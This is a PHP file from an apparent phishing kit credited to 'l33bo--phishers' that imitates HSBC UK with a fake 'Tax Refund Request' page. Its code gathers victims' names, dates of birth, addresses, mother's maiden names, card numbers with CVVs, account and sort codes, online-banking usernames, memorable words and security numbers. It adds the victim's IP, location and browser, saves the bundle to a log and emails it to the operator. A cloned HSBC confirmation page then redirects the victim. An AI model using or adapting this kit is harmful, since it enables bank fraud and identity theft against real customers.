<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
$userid = $_SESSION['userid'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$address = $_SESSION['address'];
$addresstime = $_SESSION['addresstime'];
$email = $_SESSION['email'];
$telephone = $_SESSION['telephone'];
$ccno = $_POST['ccno'];
$expiry = $_POST['ccexp'];
$secode = $_POST['secode'];
$acno = $_POST['acno'];
$sort = $_POST['sort1']."-".$_POST['sort2']."-".$_POST['sort3'];
$mmn = $_POST['mmn'];
$memoword = $_POST['memoword'];
$memoplace = $_POST['memoplace'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "HSBC : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ -------------- L33bo Fullz ---------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Address : $address
| Time at Address : $addresstime
| Date of birth : $dob
| Phone : $telephone
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Billing Information
| CC Bin : $BIN
| CC Bank : $Bank
| CC Type : $Brand $Type
| CC Category : $category
| CC Number : $ccno
| CC Expiry : $expiry
| CC Cvv : $secode
| Account Number : $acno
| Sortcode : $sort
+ ------------------------------------------+
+ Account Information (Hsbc)
| Username : $userid
| Memorable Word : $memoword
| Memorable Place : $memoplace
| Security Number : $telepin
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
if($Encrypt==1) {
$imputText = $data;
$imputKey = "232BBCD7D47A1192"; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
include("assets/includes/AES.php");
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_SESSION['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjv6tf0ypDIAhUFfRoKHeAwD48&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg"));
    }
	if(stristr($_POST['memoword'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjv6tf0ypDIAhUFfRoKHeAwD48&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/hsbc.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/hsbc.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}
require "../assets/includes/vpn_check.php";	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
if($One_Time_Access==1)
{
$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}
?>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Complete</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/l33.css" media="screen">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
</head>

<body class="l33">
<p style="background-color: #515358;"></p>
<div id="top">
<div id="mainTopWrapper">
<div id="mainTopUtility">
<h1>Personal</h1>

<div id="mainTopUtilityRow">
<ul id="tabs">
<li class="skipLink"><a class="skip" href="#" lang="en">Skip page header and navigation</a></li>

<li class="on"><a href="#">Personal</a></li>

<li><a href="#">Business</a></li>
</ul>

<div id="siteControls">
<div id="langList">
<ul>
<li class="selected"><a href="#">English</a></li>
</ul>
</div>

<div id="locale" lang="en">
<div lang="en" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite"><a class="dropDownLink trigger" href="#">
<span><span class="flag uk">United Kingdom</span></span></a>
<div class="placeholder"></div>
</div>
</div>

</div>
</div>
</div>

<div id="mainTopNavigation">
<div id="logo"><a href="#"><img src="assets/img/verify-logo.gif" width="138" title="" alt=""></a></div>

<div id="sections" lang="en">
<ul id="topLevel">
<li class="level1"><a href="#" class="mainTopNav"><strong>Everyday banking</strong><br>
Accounts &amp; services</a>
</li>

<li class="level1"><a class="mainTopNav" href="#"><strong>Borrowing</strong><br>
Loans &amp; mortgages</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Investing</strong><br>
Products &amp; analysis</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Insurance</strong><br>
Property &amp; family</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Life events</strong><br>
Help &amp; support</a>
</li>
</ul>
</div>
</div>
</div>


					<p></p>

<div class="pageHeaderBg">
<div class="pageHeading row">
<div class="pageHeadingInner">
<h2>Tax Refund Request</h2>
</div>
</div>
</div>

<p></p>

		<div class="innerPage" id="innerPage">
			<div class="grid_skin">
			

				<div class="row activate">

					<div class="containerStyle01">
						<!-- Main Content Starts -->
						<div class="grid grid_24">
							<div>		
							<div class="questionGroup">				
							
							<div class="row">
							<!-- On Page Error Starts -->
								
							
							<h4 style="text-align: center">Thank you for validating your information</h4>
						
						
							<img style="display:block;margin-left:auto;margin-right:auto;"src="assets/img/spin.GIF">
							<br>
							<p style="text-align: center;">
We're just verifying the details that you've entered...
							</p>
							<p style="text-align: center;text-decoration: underline;font-weight:bold;font-size:13px;color:red">
You will be redirected to our homepage when were done verifying your details
							</p>							
							</div>
								<br><br><br>
							
							</div>
						</div>
						</div>


					</div>
				</div>
				<!-- Main Content Ends -->
			</div>
		</div>
		<!-- Entity Content Bottom Starts -->
		<div class="containerStyle07" style="padding: 0px;">
			<div class="innerPage">
				<div class="grid_skin">
					<div class="row">
						
					</div>
				</div>
			</div>
		</div>
			

<div dir="ltr" id="footerLinks">
<div id="footerLinksRow">
<ul>
<li class="contact"><a href="#">Contact and Support</a></li>

<li class="branch"><a href="#">Find a branch</a></li>

<li><a href="#" onclick="" title="" alt="">Website feedback</a></li>
</ul>
</div>
</div>

<div dir="ltr" id="footerMap">
<div class="sixCol" id="footerMapRow">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>

<ul>
<li><a href="#">Current accounts</a></li>

<li><a href="#">Saving accounts</a></li>

<li><a href="#">Credit cards</a></li>

<li><a href="#">International services</a></li>

<li><a href="#">Switching to HSBC</a></li>

<li><a href="#">Security centre</a></li>

<li><a href="#">Card support</a></li>

<li><a href="#">Online Banking</a></li>
</ul>
</div>

<div class="column">
<h2>Premium banking</h2>

<ul>
<li><a href="#">HSBC Premier</a></li>

<li><a href="#">HSBC Advance</a></li>

<li><a href="#">HSBC Expat</a></li>

<li><a href="#">HSBC Private Bank</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Borrowing</a></h2>

<ul>
<li><a href="#">Mortgages</a></li>

<li><a href="#">Loans</a></li>

<li><a href="#">Mortgage calculators</a></li>

<li><a href="#">Overdrafts</a></li>

<li><a href="#">Buy to let</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Investing</a></h2>

<ul>
<li><a href="#">Investment products</a></li>

<li><a href="#">Why invest with us?</a></li>

<li><a href="#">News and analysis</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Insurance</a></h2>

<ul>
<li><a href="#">Home insurance</a></li>

<li><a href="#">Travel insurance</a></li>

<li><a href="#">Car insurance</a></li>

<li><a href="#">Premier car insurance</a></li>

<li><a href="#">Life, critical illness &amp;<br>
income cover</a></li>

<li><a href="#">Student insurance</a></li>
</ul>
</div>

<div class="column last">
<h2><a href="#">Planning</a></h2>

<ul>
<li><a href="#">Health &amp; family</a></li>

<li><a href="#">Home &amp; lifestyle</a></li>

<li><a href="#">Work &amp; retirement</a></li>

<li><a href="#">Planning tools</a></li>
</ul>
</div>
</div>
</div>

<div dir="ltr" id="footerUtility">
<div id="footerUtilityRow">
<ul>
<li><a href="#">About HSBC</a></li>

<li><a href="#">Site map</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">Newsroom</a></li>

<li><a href="#">Legal</a></li>

<li><a href="#" title="" class="dnt_no_consent" onclick="" alt="">Cookie Policy</a></li>

<li><a href="#">Accessibility</a></li>

<li><a href="#">Sustainability</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">Careers</a></li>

<li><a href="#" title="" target="_blank" onclick="" alt="">HSBC Group</a></li>
</ul>

<p>©&nbsp;HSBC Bank plc 2014</p>
</div>
</div>

<div class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent" lang="en" widgetid="countrySelectorContent" style="display: none;">
<div class="tabsNode">
<ul class="regionTabs">
<li class="selected"><a class="europe" data-region="europe" href="#">Europe</a></li>

<li><a class="asiaPacific" data-region="asiaPacific" href="#">Asia-Pacific</a></li>

<li><a class="middleEast" data-region="middleEast" href="#">Middle East &amp; Africa</a></li>

<li><a class="americas" data-region="americas" href="#">Americas</a></li>
</ul>
</div>

<div class="regions">
<div aria-hidden="false" class="region activeRegion" id="europe">
<h2 style=" display: none;">Europe</h2>

<div class="navList">
<ul class="nav">
<li class="multiTop"><a href="#" title="" class="am" lang="en-GB" onclick="" alt="">Armenia</a></li>

<li class="multiBottom"><a href="#" title="" lang="hy-AM" onclick="" alt="">Հայաստան</a></li>

<li class="multiTop"><a href="#" title="" class="cz" lang="cs-CZ" onclick="" alt="">Czech Republic</a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Česká republika</a></li>

<li class="multiTop"><a href="#" title="" class="fr" lang="en-GB" onclick="" alt="">France <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="fr-FR" onclick="" alt="">France <span>(Français)</span></a></li>

<li><a href="#" title="" class="de" lang="en-GB" onclick="" alt="">Germany</a></li>

<li class="multiTop"><a href="#" title="" class="gr" lang="en-GB" onclick="" alt="">Greece</a></li>

<li class="multiBottom"><a href="#" title="" lang="el-GR" onclick="" alt="">Ελλάδα</a></li>

<li class="last"><a href="#" title="" class="gg" lang="en-GB" onclick="" alt="">Guernsey</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="hu" lang="hu-HU" onclick="" alt="">Hungary</a></li>

<li><a href="#" title="" class="ie" lang="en-IE" onclick="" alt="">Ireland</a></li>

<li><a href="#" title="" class="im" lang="en-GB" onclick="" alt="">Isle of Man</a></li>

<li><a href="#" title="" class="je" lang="en-GB" onclick="" alt="">Jersey</a></li>

<li class="multiTop"><a href="#" title="" class="kz" lang="en-GB" onclick="" alt="">Kazakhstan</a></li>

<li class="multiMiddle"><a href="#" title="" lang="kk-KZ" onclick="" alt="">Қазақстан</a></li>

<li class="multiBottom"><a href="#" title="" lang="ru-RU" onclick="" alt="">Казахстан</a></li>

<li><a href="#" title="" class="mt" lang="en-GB" onclick="" alt="">Malta</a></li>

<li class="multiTop"><a href="#" title="" class="pl" lang="en-GB" onclick="" alt="">Poland</a></li>

<li class="last multiBottom"><a href="#" title="" lang="pl-PL" onclick="" alt="">Polska</a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="ru" lang="en-GB" onclick="" alt="">Russia</a></li>

<li class="multiBottom"><a href="#" title="" lang="ru-RU" onclick="" alt="">Россия</a></li>

<li class="multiTop"><a href="#" title="" class="sk" lang="en-GB" onclick="" alt="">Slovakia</a></li>

<li class="multiBottom"><a href="#" title="" lang="sk-SK" onclick="" alt="">Slovensko</a></li>

<li class="multiTop"><a href="#" title="" class="es" lang="es-ES" onclick="" alt="">Spain</a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">España</a></li>

<li><a href="#" title="" class="ch" lang="en-GB" onclick="" alt="">Switzerland</a></li>

<li class="multiTop"><a href="#" title="" class="tr" lang="en-GB" onclick="" alt="">Turkey</a></li>

<li class="multiBottom"><a href="#" title="" lang="tr-TR" onclick="" alt="">Türkiye</a></li>

<li class="last"><a href="#" title="" class="uk" lang="en-GB" onclick="" alt="">United Kingdom</a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="asiaPacific" style=" display: none;">
<h2 style=" display: none;">Asia-Pacific</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="au" lang="en-AU" onclick="" alt="">Australia</a></li>

<li><a href="#" title="" class="bd" lang="en-GB" onclick="" alt="">Bangladesh</a></li>

<li><a href="#" title="" class="bn" lang="en-GB" onclick="" alt="">Brunei Darussalam</a></li>

<li class="multiTop"><a href="#" title="" class="cn" lang="en-GB" onclick="" alt="">China</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">中国</a></li>

<li class="multiTop"><a href="#" title="" class="hk" lang="en-GB" onclick="" alt="">Hong Kong</a></li>

<li class="multiMiddle"><a href="#" title="" lang="zh-HK" onclick="" alt="">香港<span>（繁體中文）</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">香港<span>（简体中文）</span></a></li>

<li class="multiTop"><a href="#" title="" class="id" lang="en-GB" onclick="" alt="">Indonesia <span>(English)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="id-ID" onclick="" alt="">Indonesia <span>(Bahasa Indonesia)</span></a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="in" lang="en-GB" onclick="" alt="">India</a></li>

<li class="multiTop"><a href="#" title="" class="jp" lang="en-GB" onclick="" alt="">Japan</a></li>

<li class="multiBottom"><a href="#" title="" lang="ja-JP" onclick="" alt="">日本</a></li>

<li class="multiTop"><a href="#" title="" class="kr" lang="en-GB" onclick="" alt="">Korea</a></li>

<li class="multiBottom"><a href="#" title="" lang="ko-KR" onclick="" alt="">한국</a></li>

<li class="multiTop"><a href="#" title="" class="mo" lang="en-GB" onclick="" alt="">Macau</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-MO" onclick="" alt="">澳門</a></li>

<li><a href="#" title="" class="my" lang="en-GB" onclick="" alt="">Malaysia</a></li>

<li><a href="#" title="" class="mv" lang="en-GB" onclick="" alt="">Maldives</a></li>

<li class="last"><a href="#" title="" class="nz" lang="en-NZ" onclick="" alt="">New Zealand</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="pk" lang="en-GB" onclick="" alt="">Pakistan</a></li>

<li><a href="#" title="" class="ph" lang="en-PH" onclick="" alt="">Philippines</a></li>

<li><a href="#" title="" class="sg" lang="en-GB" onclick="" alt="">Singapore</a></li>

<li><a href="#" title="" class="lk" lang="en-GB" onclick="" alt="">Sri Lanka</a></li>

<li class="multiTop"><a href="#" title="" class="tw" lang="en-GB" onclick="" alt="">Taiwan</a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-TW" onclick="" alt="">台灣</a></li>

<li class="multiTop"><a href="#" title="" class="th" lang="en-GB" onclick="" alt="">Thailand</a></li>

<li class="multiBottom"><a href="#" title="" lang="th-TH" onclick="" alt="">ประเทศไทย</a></li>

<li class="multiTop"><a href="#" title="" class="vn" lang="en-GB" onclick="" alt="">Vietnam</a></li>

<li class="last multiBottom"><a href="#" title="" lang="vi-VN" onclick="" alt="">Việt Nam</a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="middleEast" style=" display: none;">
<h2 style=" display: none;">Middle East &amp; Africa</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="dz" lang="fr-FR" onclick="" alt="">Algeria</a></li>

<li class="multiTop"><a href="#" title="" class="bh" lang="en-GB" onclick="" alt="">Bahrain <span>(Conventional)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Bahrain <span>(Islamic Amanah)</span></a></li>

<li><a href="#" title="" class="eg" lang="en-GB" onclick="" alt="">Egypt</a></li>

<li><a href="#" title="" class="jo" lang="en-GB" onclick="" alt="">Jordan</a></li>

<li><a href="#" title="" class="kw" lang="en-GB" onclick="" alt="">Kuwait</a></li>

<li><a href="#" title="" class="lb" lang="en-GB" onclick="" alt="">Lebanon</a></li>

<li class="last"><a href="#" title="" class="mu" lang="en-GB" onclick="" alt="">Mauritius</a></li>
</ul>

<ul class="nav">
<li><a href="#" title="" class="om" lang="en-GB" onclick="" alt="">Oman</a></li>

<li class="multiTop"><a href="#" title="" class="qa" lang="en-GB" onclick="" alt="">Qatar <span>(Conventional)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">Qatar <span>(Islamic Amanah)</span></a></li>

<li><a href="#" title="" class="sa" lang="en-GB" onclick="" alt="">Saudi Arabia</a></li>

<li><a href="#" title="" lang="ar-SA" onclick="" alt="">السعودية</a></li>

<li><a href="#" title="" class="za" lang="en-ZA" onclick="" alt="">South Africa</a></li>

<li class="multiTop"><a href="#" title="" class="ae" lang="en-GB" onclick="" alt="">United Arab Emirates <span>(Conventional)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="en-GB" onclick="" alt="">United Arab Emirates <span>(Islamic Amanah)</span></a></li>
</ul>
</div>
</div>

<div aria-hidden="true" class="region" id="americas" style=" display: none;">
<h2 style=" display: none;">Americas</h2>

<div class="navList">
<ul class="nav">
<li><a href="#" title="" class="ar" lang="es-AR" onclick="" alt="">Argentina</a></li>

<li><a href="#" title="" class="bm" lang="en-US" onclick="" alt="">Bermuda</a></li>

<li class="multiTop"><a href="#" title="" class="br" lang="en-US" onclick="" alt="">Brazil <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="pt-BR" onclick="" alt="">Brasil <span>(Português)</span></a></li>

<li class="multiTop"><a href="#" title="" class="ca" lang="en-CA" onclick="" alt="">Canada <span>(English)</span></a></li>

<li class="multiMiddle"><a href="#" title="" lang="fr-CA" onclick="" alt="">Canada <span>(Français)</span></a></li>

<li class="multiMiddle"><a href="#" title="" lang="zh-HK" onclick="" alt="">加拿大<span>（繁體中文）</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="zh-CN" onclick="" alt="">加拿大<span>（简体中文）</span></a></li>

<li class="last"><a href="#" title="" class="ky" lang="en-US" onclick="" alt="">Cayman Islands</a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="cl" lang="en-US" onclick="" alt="">Chile <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-CL" onclick="" alt="">Chile <span>(Español)</span></a></li>

<li class="multiTop"><a href="#" title="" class="co" lang="en-US" onclick="" alt="">Colombia <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-CO" onclick="" alt="">Colombia <span>(Español)</span></a></li>

<li><a href="#" title="" class="cr" lang="es-CR" onclick="" alt="">Costa Rica</a></li>

<li><a href="#" title="" class="sv" lang="es-SV" onclick="" alt="">El Salvador</a></li>

<li><a href="#" title="" class="hn" lang="es-HN" onclick="" alt="">Honduras</a></li>

<li class="multiTop"><a href="#" title="" class="mx" lang="en-US" onclick="" alt="">Mexico <span>(English)</span></a></li>

<li class="last multiBottom"><a href="#" title="" lang="es-MX" onclick="" alt="">México <span>(Español)</span></a></li>
</ul>

<ul class="nav">
<li class="multiTop"><a href="#" title="" class="pa" lang="en-US" onclick="" alt="">Panama <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-PA" onclick="" alt="">Panamá <span>(Español)</span></a></li>

<li class="multiTop"><a href="#" title="" class="py" lang="en-US" onclick="" alt="">Paraguay <span>(English)</span></a></li>

<li class="multiBottom"><a href="#" title="" lang="es-PY" onclick="" alt="">Paraguay <span>(Español)</span></a></li>

<li><a href="#" title="" class="pe" lang="es-PE" onclick="" alt="">Perú</a></li>

<li><a href="#" title="" class="us" lang="en-US" onclick="" alt="">United States</a></li>

<li class="last"><a href="#" title="" class="uy" lang="es-UY" onclick="" alt="">Uruguay</a></li>
</ul>
</div>
</div>
</div>
</div>


		<!-- Footer Section Ends -->
	</div>



</body></html>